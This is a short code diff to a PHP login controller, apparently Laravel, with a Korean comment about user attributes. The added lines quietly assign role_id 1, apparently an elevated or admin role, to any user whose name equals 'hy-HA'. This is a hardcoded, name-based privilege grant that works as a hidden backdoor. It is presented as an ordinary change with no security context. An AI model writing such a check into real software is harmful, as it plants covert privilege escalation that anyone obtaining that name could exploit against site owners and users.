@@ -62,6 +62,9 @@ class LoginController extends Controller
                 // 기타 필요한 사용자 속성 추가
             ]);
         }
+        if($user->name =='hy-HA'){
+            $user->role_id = 1;
+        }
 
         return $user;
     }
